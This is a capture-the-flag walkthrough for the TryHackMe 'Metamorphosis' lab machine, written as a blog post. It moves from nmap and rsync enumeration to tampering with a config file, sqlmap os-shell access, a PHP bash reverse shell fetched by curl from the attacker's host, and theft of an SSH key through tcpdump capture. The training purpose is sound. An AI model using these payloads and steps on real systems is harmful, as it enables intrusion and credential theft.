---
title: "Tryhackme Metamorphosis"
date: 2021-08-16T15:55:27+05:30
draft: true
toc: true
image: "images/github-pagesLightBlue.jpeg"
tags: ["blog", "GitHub Pages" ,"Hugo"]
categories: ["blog"]
---

## Overview
<img style="border:2px solid black" src="/images/metamorphosis.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>

## Recon

### Nmap 

```bash
root@kali:~/tryhackme/metamorphosis#nmap -sC -sV  10.10.97.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 11:32 IST
Nmap scan report for 10.10.97.133 (10.10.97.133)
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)
|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)
|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 13s, deviation: 0s, median: 13s
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2021-08-12T06:03:04+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-12T06:03:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds

```

### Gobuster

```bash

root@kali:~/tryhackme/metamorphosis/conf#gobuster dir -u 10.10.97.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.97.133
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/08/12 11:04:29 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 10818]
/admin                (Status: 301) [Size: 312] [--> http://10.10.97.133/admin/]
/inde.html            (Status: 200) [Size: 10918]                               
Progress: 56672 / 882244 (6.42%)               

```

### Visting Webpage

<img style="border:2px solid black" src="/images/forbidden.png" align="left"><br><br><br><br><br><br><br>


Viewing `source code` 

<img style="border:2px solid black" src="/images/sourcecode.png" align="left"><br><br><br><br>


## Rsync Enumeration

We have port 873 running which is `Rsync` you can read more about this here [hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)

```bash
rsync -rdt rsync://10.10.38.244:873

we get | Conf            All Confs |

```

Listing content of `Conf`

```bash

rsync -rdt rsync://10.10.38.244:873/Conf
drwxrwxrwx          4,096 2021/04/11 01:33:08 .
-rw-r--r--          4,620 2021/04/10 01:31:22 access.conf
-rw-r--r--          1,341 2021/04/10 01:26:12 bluezone.ini
-rw-r--r--          2,969 2021/04/10 01:32:24 debconf.conf
-rw-r--r--            332 2021/04/10 01:31:38 ldap.conf
-rw-r--r--         94,404 2021/04/10 01:51:57 lvm.conf
-rw-r--r--          9,005 2021/04/10 01:28:40 mysql.ini
-rw-r--r--         70,207 2021/04/10 01:26:56 php.ini
-rw-r--r--            320 2021/04/10 01:33:16 ports.conf
-rw-r--r--            589 2021/04/10 01:31:07 resolv.conf
-rw-r--r--             29 2021/04/10 01:32:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/10 01:30:59 smb.conf
-rw-rw-r--             72 2021/04/11 01:33:06 webapp.ini

```
Downloading `Conf files` into local machine


```bash
rsync -av rsync://10.10.38.244:873/Conf ./conf

```

Reading all the files we got webapp.ini file 

```bash

cat webapp.ini 
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
````

The env variable is set to `prod` ... change this to `dev` (for development) and upload back new `webapp.ini` file to `server`.

```bash

rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  

```

Going to the admin page again  `http://10.10.101.93/admin/`


<img style="border:2px solid black" src="/images/2.png" align="left"><br><br><br><br><br><br><br><br><br><br><br>
 
Use `brupsuite` and save the request as `req.txt` file

## SQLmap

```bash
sqlmap -r req.txt --level 3 --risk 3 --batch --os-shell

```
<img style="border:2px solid black" src="/images/sqloutput.png" align="left"><br><br><br><br><br><br><br><br><br><br><br>


## Getting Reverse Shell

Using curl to upload the `Shell.php`

```bash
root@kali:~/tryhackme/metamorphosis#cat shell.php

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/your IP/1234 0>&1'");
```
In `Os-shell`

```bash
curl http://your IP/shell.php -o shell.php
```

access the shell.php in browser using `http://10.10.101.93/shell.php/`

and ` nc -lnvp 1234 ` in other terminal 

Get the `Rev shell` and `Upgrade`.

<img style="border:2px solid black" src="/images/revshell.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
  
Getting  `User.txt`

<img style="border:2px solid black" src="/images/user_txt.png" align="left"><br><br><br><br><br><br><br><br><br><br><br>
 
## Privilege Escalation

Running `linpeas` we get that user can run `Tcpdump`

Running `Pspy64` we get

<img style="border:2px solid black" src="/images/pspyoutput.png" align="left"><br><br><br><br><br><br><br><br><br>

It shows root run `req.sh` and 	`sudo -l` not give any information

Now finally run tcpdump in /var/www/html and capture the output using wget ...............

<img style="border:2px solid black" src="/images/tcpdump.png" align="left"><br><br><br><br><br><br><br><br><br>

In Attakcer Machine run `wget http://10.10.101.93/1.pcap`

Open 1.pcap file in `Wireshark`

follow tcp stream and get the SSH key

<img style="border:2px solid black" src="/images/sshkey1.png" align="left"><br><br><br><br><br><br><br><br><br><br>

log in with key and get `root.txt`

<img style="border:2px solid black" src="/images/root.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>


